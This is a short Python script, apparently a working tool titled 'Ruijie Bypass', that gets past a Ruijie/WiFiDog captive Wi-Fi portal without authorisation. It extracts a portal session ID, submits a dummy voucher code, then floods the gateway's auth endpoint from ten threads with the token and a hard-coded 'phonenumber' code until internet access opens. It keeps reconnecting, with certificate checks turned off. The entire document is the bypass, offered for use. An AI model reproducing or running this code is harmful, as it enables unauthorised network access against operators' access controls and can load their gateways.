#!/usr/bin/env python3
"""
Ruijie Bypass - High-speed ping method (matching core.so approach)
"""
import sys, threading, time, urllib.parse
import requests, urllib3
urllib3.disable_warnings()

CODE = "102762"

def main():
    while True:
        sess = requests.Session()
        sess.verify = False

        try:
            # Get session
            r = sess.get("http://connectivitycheck.gstatic.com/generate_204", timeout=10)
            if r.url == "http://connectivitycheck.gstatic.com/generate_204":
                # Already online, check
                try:
                    r2 = sess.get("http://www.google.com", timeout=3)
                    if r2.status_code == 200:
                        time.sleep(5); continue
                except: pass

            parsed = urllib.parse.urlparse(r.url)
            params = urllib.parse.parse_qs(parsed.query)
            host = f"{parsed.scheme}://{parsed.netloc}"

            r = sess.get(f"{host}/api/auth/wifidog?stage=portal&{parsed.query}", timeout=10)
            sid = urllib.parse.parse_qs(urllib.parse.urlparse(r.url).query).get("sessionId", [""])[0]
            if not sid: time.sleep(3); continue

            gw_addr = params.get("gw_address", ["192.168.10.1"])[0]
            gw_port = params.get("gw_port", ["2060"])[0]

            print(f"[SID] {sid[:16]}...  [GW] {gw_addr}:{gw_port}")

            # Try voucher API (may fail, doesn't matter)
            try:
                r = sess.post(f"{host}/api/auth/voucher/", json={
                    "accessCode": "123456", "sessionId": sid, "apiVersion": 1
                }, timeout=5)
            except: pass

            # High-speed ping with phonenumber
            ping_url = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber={CODE}"
            stop = False

            def pinger():
                while not stop:
                    try: sess.get(ping_url, timeout=3)
                    except: break

            for _ in range(10):
                threading.Thread(target=pinger, daemon=True).start()

            print("[Pinging...]")
            for _ in range(30):
                time.sleep(2)
                try:
                    r = sess.get("http://www.google.com", timeout=3)
                    if r.status_code == 200:
                        print("*** ONLINE ***")
                        while True:
                            time.sleep(5)
                            try:
                                r = sess.get("http://www.google.com", timeout=3)
                                if r.status_code != 200: break
                            except: break
                        print("[Disconnected]")
                        break
                except: pass
            else:
                print("[Failed]")

        except KeyboardInterrupt: print("\nStopped"); sys.exit(0)
        except Exception as e: print(f"[!] {e}")
        finally:
            sess.close(); time.sleep(3)

if __name__ == "__main__":
    main()
